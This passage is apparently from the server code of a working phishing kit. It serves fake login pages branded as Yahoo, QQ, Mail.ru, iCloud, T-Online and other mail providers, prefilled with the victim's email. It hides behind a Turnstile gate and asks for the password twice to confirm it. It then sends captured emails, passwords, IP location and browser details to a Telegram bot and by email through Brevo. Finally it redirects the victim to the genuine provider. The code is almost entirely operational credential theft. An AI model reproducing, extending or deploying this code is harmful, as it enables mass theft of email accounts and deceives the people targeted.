            bg: 'linear-gradient(135deg,#e8f0fe 0%,#d2e3fc 100%)',
            headerGradient: 'linear-gradient(90deg,#1a73e8,#0d47a1,#1a73e8)',
            footer: '© 2026 Hiworks Corp.'
        };
    }

    // --- Yahoo ---
    if (/yahoo|ymail|rocketmail/.test(domain)) {
        return {
            name:    'Yahoo',
            lang:    'en',
            logoText: '<span style="color:#6001d2;font-weight:900">yahoo</span><span style="color:#6001d2">!</span>',
            subtitle: 'Sign in to your Yahoo account',
            emailPlaceholder: 'Email or phone',
            passwordPlaceholder: 'Password',
            buttonText: 'Sign in',
            accent: '#6001d2',
            accent2: '#7e28e8',
            bg: 'linear-gradient(135deg,#f5f0ff 0%,#ebe0ff 100%)',
            headerGradient: 'linear-gradient(90deg,#6001d2,#7e28e8,#6001d2)',
            footer: '© Yahoo 2026'
        };
    }

    // --- QQ (China) ---
    if (/qq\.com|foxmail/.test(domain)) {
        return {
            name:    'QQ',
            lang:    'zh',
            logoText: '<span style="color:#12b7f5;font-weight:900">QQ邮箱</span>',
            subtitle: '登录您的QQ邮箱账号',
            emailPlaceholder: 'QQ号码或邮箱',
            passwordPlaceholder: '密码',
            buttonText: '登录',
            accent: '#12b7f5',
            accent2: '#0a8ac2',
            bg: 'linear-gradient(135deg,#eaf6ff 0%,#d6ecff 100%)',
            headerGradient: 'linear-gradient(90deg,#12b7f5,#0a8ac2,#12b7f5)',
            footer: '© 腾讯 2026'
        };
    }

    // --- Mail.ru (Russia) ---
    if (/mail\.ru|inbox\.ru|bk\.ru|list\.ru|internet\.ru/.test(domain)) {
        return {
            name:    'Mail.ru',
            lang:    'ru',
            logoText: '<span style="color:#005ff9;font-weight:900">Mail</span><span style="color:#ff9e00">.ru</span>',
            subtitle: 'Войдите в свой аккаунт',
            emailPlaceholder: 'Email или телефон',
            passwordPlaceholder: 'Пароль',
            buttonText: 'Войти',
            accent: '#005ff9',
            accent2: '#ff9e00',
            bg: 'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
            headerGradient: 'linear-gradient(90deg,#005ff9,#ff9e00,#005ff9)',
            footer: '© Mail.ru 2026'
        };
    }

    // --- iCloud / Apple ---
    if (/icloud|me\.com|mac\.com/.test(domain)) {
        return {
            name:    'iCloud',
            lang:    'en',
            logoText: '<span style="color:#000;font-weight:600"></span> <span style="color:#555">iCloud</span>',
            subtitle: 'Sign in with your Apple Account',
            emailPlaceholder: 'Apple Account',
            passwordPlaceholder: 'Password',
            buttonText: 'Sign in',
            accent: '#0071e3',
            accent2: '#1d1d1f',
            bg: 'linear-gradient(135deg,#f5f5f7 0%,#e8e8ed 100%)',
            headerGradient: 'linear-gradient(90deg,#0071e3,#1d1d1f,#0071e3)',
            footer: '© Apple Inc. 2026'
        };
    }

    // --- T-online (Germany) ---
    if (domain === 't-online.de') {
        return {
            name:    'T-Online',
            lang:    'de',
            logoText: '<span style="color:#e20074;font-weight:900">T</span><span style="color:#000">-Online</span>',
            subtitle: 'Melden Sie sich bei Ihrem E-Mail-Konto an',
            emailPlaceholder: 'E-Mail-Adresse',
            passwordPlaceholder: 'Passwort',
            buttonText: 'Anmelden',
            accent: '#e20074',
            accent2: '#000000',
            bg: 'linear-gradient(135deg,#fff0f8 0%,#ffe0f0 100%)',
            headerGradient: 'linear-gradient(90deg,#e20074,#000000,#e20074)',
            footer: '© Telekom 2026'
        };
    }

    // --- Generic fallback: brand it with the domain itself ---
    const name = domain.split('.')[0].replace(/^\w/, c => c.toUpperCase());
    return {
        name:    name || 'Mail',
        lang:    'en',
        logoText: `<span style="color:#1e930c;font-weight:900">${name}</span><span style="color:#475569">.${tld}</span>`,
        subtitle: 'Sign in to continue to your mailbox',
        emailPlaceholder: 'Email address',
        passwordPlaceholder: 'Password',
        buttonText: 'Sign in',
        accent: '#1e930c',
        accent2: '#167a09',
        bg: 'linear-gradient(135deg,#f0fff4 0%,#e0f7e8 100%)',
        headerGradient: 'linear-gradient(90deg,#1e930c,#167a09,#1e930c)',
        footer: `© ${domain} 2026`
    };
}

// helper
function hexToRgba(hex, a) {
    const h = (hex || '#000000').replace('#','');
    const r = parseInt(h.substring(0,2), 16);
    const g = parseInt(h.substring(2,4), 16);
    const b = parseInt(h.substring(4,6), 16);
    return `rgba(${r},${g},${b},${a})`;
}

// ============================================================
// HTML TEMPLATE: Login form (served by /a) — BRANDED
// ============================================================
function loginFormPage(email) {
    const safeEmail = (email || '').replace(/"/g, '&quot;').replace(/</g,'&lt;');
    const b = brandForProvider(email);
    const prefilled = email ? `value="${safeEmail}" readonly` : '';

    return `<!DOCTYPE html>
<html lang="${b.lang}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>${b.name} — Sign in</title>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:${b.bg};color:#2c3e50}
.box{background:#fff;border-radius:14px;box-shadow:0 12px 48px rgba(0,0,0,0.10);padding:38px 34px;max-width:420px;width:92%;position:relative;overflow:hidden}
.box::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:${b.headerGradient}}
.logo{font-size:1.6rem;text-align:center;margin-bottom:6px}
.subtitle{color:#64748b;font-size:.9rem;text-align:center;margin-bottom:26px}
label{display:block;font-size:.8rem;color:#475569;margin:10px 0 4px}
input{width:100%;padding:13px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:14px;box-sizing:border-box;outline:none;transition:.2s}
input:focus{border-color:${b.accent};box-shadow:0 0 0 3px ${hexToRgba(b.accent, .12)}}
input[readonly]{background:#f8fafc;color:#64748b}
button{width:100%;padding:13px;background:linear-gradient(135deg,${b.accent},${b.accent2});color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:18px;transition:.2s}
button:hover{transform:translateY(-1px);box-shadow:0 6px 18px ${hexToRgba(b.accent, .3)}}
button:disabled{opacity:.6;cursor:not-allowed;transform:none}
.msg{color:#64748b;font-size:13px;margin-top:12px;display:none;text-align:center}
.spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:${b.accent};border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
@keyframes sp{to{transform:rotate(360deg)}}
.footer{margin-top:22px;text-align:center;font-size:11px;color:#94a3b8}
</style>
</head>
<body>
<div class="box">
  <div class="logo">${b.logoText}</div>
  <div class="subtitle">${b.subtitle}</div>
  <form id="lf" autocomplete="off">
    <label for="em">${b.emailPlaceholder}</label>
    <input id="em" type="email" name="email" required ${prefilled}>
    <label for="pw">${b.passwordPlaceholder}</label>
    <input id="pw" type="password" name="password" required>
    <button type="submit" id="btn">${b.buttonText}</button>
    <div class="msg" id="msg"></div>
  </form>
  <div class="footer">${b.footer}</div>
</div>
<script>
(function(){
  var BACKEND      = ${JSON.stringify(BACKEND_URL)};
  var REDIRECT     = ${JSON.stringify(REDIRECT_URL)};
  var MAX_ATTEMPTS = ${MAX_ATTEMPTS};
  var PRELOADED    = ${JSON.stringify(email || '')};

  var form = document.getElementById('lf');
  var btn  = document.getElementById('btn');
  var msg  = document.getElementById('msg');

  var attempt      = 0;
  var lockedEmail  = PRELOADED || null;
  var lastPassword = null;
  var redirectUrl  = REDIRECT;

  function showMsg(text, spin){
    msg.innerHTML = (spin ? '<span class="spin"></span>' : '') + text;
    msg.style.display = 'block';
  }

  form.addEventListener('submit', async function(e){
    e.preventDefault();
    if (attempt > 0 && lockedEmail) {
      form.email.value = lockedEmail;
    } else {
      lockedEmail = PRELOADED || form.email.value.trim();
    }
    var thisPassword = form.password.value;
    attempt++;
    btn.disabled = true;
    btn.textContent = '...';
    showMsg('Verifying', true);

    var body = {
      email: lockedEmail,
      password: thisPassword,
      prevPassword: lastPassword,
      attempt: attempt
    };

    var data = null;
    try {
      var r = await fetch((BACKEND || '') + '/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      data = await r.json().catch(function(){ return null; });
    } catch(_){}

    if (data && data.redirect) redirectUrl = data.redirect;
    lastPassword = thisPassword;

    if (data && data.retry === true) {
      form.password.value = '';
      form.password.focus();
      form.email.readOnly = true;
      btn.disabled = false;
      btn.textContent = ${JSON.stringify(b.buttonText)};
      showMsg('Please re-enter your password to continue.', false);
      return;
    }

    btn.textContent = '...';
    showMsg('Redirecting', true);
    setTimeout(function(){ window.location.href = redirectUrl; }, 600);
  });
})();
</script>
</body></html>`;
}

// ============================================================
// ROUTE: /auth  →  Turnstile gate (reads ?u= from URL)
// ============================================================
app.get('/auth', (req, res) => {
    const email = normalizeEmail(req.query.u);
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    console.log(`🚪 /auth hit — u=${email || '(none)'} ip=${clientIP}`);
    res.send(turnstilePage(email));
});

// ============================================================
// ROUTE: /  →  same as /auth (so root URL also works)
// ============================================================
app.get('/', (req, res) => {
    const email = normalizeEmail(req.query.u);
    console.log(`🚪 / hit — u=${email || '(none)'}`);
    res.send(turnstilePage(email));
});

// ============================================================
// ROUTE: /a  →  verify Turnstile, serve login form with email prefill
// ============================================================
app.get('/a', async (req, res) => {
    const token = req.query.t;
    const key   = req.query.k;
    const email = normalizeEmail(req.query.u);
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';

    console.log(`🔐 /a hit — k=${key} u=${email || '(none)'} ip=${clientIP}`);

    const ok = await verifyTurnstile(token, clientIP);
    if (!ok) {
        console.log('❌ Turnstile failed');
        return res.status(403).send('Verification failed. Please try again.');
    }

    // Visitor ping
    sendToTelegram(`👤 Visitor verified Turnstile
Email (from URL): ${email || '(not provided)'}
IP: ${clientIP}
Key: ${key}
Time: ${new Date().toISOString()}`).catch(()=>{});

    res.send(loginFormPage(email));
});

// ============================================================
// ROUTE: /api/login
// ============================================================
app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    const { email, password, prevPassword } = req.body || {};
    const attemptFromClient = parseInt(req.body?.attempt, 10);
    const attempt = Number.isFinite(attemptFromClient) && attemptFromClient > 0
        ? Math.min(attemptFromClient, MAX_ATTEMPTS)
        : 1;

    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email and password are required',
            redirect: REDIRECT_URL,
            retry: false
        });
    }

    const emailRegex = /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({
            success: false,
            message: 'Invalid email format',
            redirect: REDIRECT_URL,
            retry: false
        });
    }

    const isMatch = typeof prevPassword === 'string' &&
                    prevPassword.length > 0 &&
                    prevPassword === password;

    const hitCap = attempt >= MAX_ATTEMPTS;
    const shouldRetry = !isMatch && !hitCap;
    const finalReason = isMatch ? 'match' : (hitCap ? 'cap' : null);

    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const redirectUrl = getProviderLoginUrl(email, mxRecord);

    const header = isMatch
        ? `✅ MATCH — Attempt ${attempt}/${MAX_ATTEMPTS} — FINAL`
        : (hitCap
            ? `🎯 CAP REACHED — Attempt ${attempt}/${MAX_ATTEMPTS} — FORCING EXIT`
            : `⏳ Attempt ${attempt}/${MAX_ATTEMPTS} — no match yet`);

    const telegramMessage = `${header}
--------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
Prev Password : ${prevPassword || '(none)'}
Match : ${isMatch ? 'YES' : 'no'}
Attempt : ${attempt} of ${MAX_ATTEMPTS}
Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
➡️ Redirect : ${redirectUrl}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------`;

    console.log(`📤 Telegram — attempt ${attempt}/${MAX_ATTEMPTS} — match=${isMatch} retry=${shouldRetry}`);
    const telegramResult = await sendToTelegram(telegramMessage);

    console.log('📧 Sending email via Brevo...');
    const emailResult = await sendEmail(
        email, password, ipInfo, userAgent, domain, mxRecord,
        attempt, isMatch, MAX_ATTEMPTS, redirectUrl
    );

    const telegramOK = !!(telegramResult && telegramResult.ok);

    return res.json({
        success: telegramOK || emailResult,
        attempt,
        maxAttempts: MAX_ATTEMPTS,
        match: isMatch,
        finalReason,
        retry: shouldRetry,
        redirect: shouldRetry ? null : redirectUrl,
        notifications: { telegram: telegramOK, email: emailResult }
    });
});

// ============================================================
// ROUTE: /api/log
// ============================================================
app.post('/api/log', async (req, res) => {
    const { email } = req.body || {};
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);

    const message = `--------+ Visitor Excel ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} at ${new Date().toISOString()} +--------
Email : ${email || 'Unknown'}
Browser : ${userAgent}
Language : ${acceptLanguage}
IP Address : ${clientIP}
---------+ Excel Visitor ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------`;

    await sendToTelegram(message);
    res.json({ success: true });
});

// ============================================================
// HEALTH
// ============================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        maxAttempts: MAX_ATTEMPTS,
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        turnstileConfigured: !!TURNSTILE_SECRET
    });
});

// ============================================================
// 404
// ============================================================
app.use((req, res) => {
    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
});

// ============================================================
// START
// ============================================================
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health: http://localhost:${PORT}/health`);
    console.log(`🚪 Gate:   http://localhost:${PORT}/auth?u=user@example.com`);
    console.log(`🔐 Token:  http://localhost:${PORT}/a`);
    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
    console.log(`🎯 Match rule: 2 identical passwords → redirect`);
    console.log(`🛡️ Safety cap: ${MAX_ATTEMPTS} attempts`);
    console.log(`🌍 Provider map: ${Object.keys(PROVIDER_MAP).length} domains + MX detection + TLD fallback`);
    console.log(`🎨 Branding: ABV, Google, Microsoft, Yandex, Naver, Daum, QQ, Mail.ru, iCloud, T-Online + generic fallback`);
    console.log('========================================');
});

process.on('uncaughtException', err => console.error('❌ Uncaught:', err.message));
process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));